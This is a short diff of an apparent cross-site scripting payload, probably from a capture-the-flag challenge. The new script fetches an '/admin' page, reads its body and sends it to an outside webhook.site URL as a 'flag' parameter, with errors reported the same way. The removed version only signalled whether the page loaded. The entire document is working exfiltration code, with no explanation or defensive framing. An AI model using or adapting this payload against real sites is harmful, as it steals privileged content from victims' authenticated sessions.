@@ -1,17 +1,14 @@
-<!doctype html>
-<html>
-<body>
 <script>
-var img = new Image();
-img.src = '/admin';
-img.onload = function () {
-  new Image().src =
-    'https://webhook.site/0c2a0964-b6a5-49fd-989f-0c6e3593cd7b?stage=img_loaded';
-};
-img.onerror = function () {
-  new Image().src =
-    'https://webhook.site/0c2a0964-b6a5-49fd-989f-0c6e3593cd7b?stage=img_error';
-};
+fetch('/admin')
+  .then(r => r.text())
+  .then(d => {
+    new Image().src =
+      'https://webhook.site/0c2a0964-b6a5-49fd-989f-0c6e3593cd7b?flag='
+      + encodeURIComponent(d);
+  })
+  .catch(e => {
+    new Image().src =
+      'https://webhook.site/0c2a0964-b6a5-49fd-989f-0c6e3593cd7b?err='
+      + encodeURIComponent(e);
+  });
 </script>
-</body>
-</html>
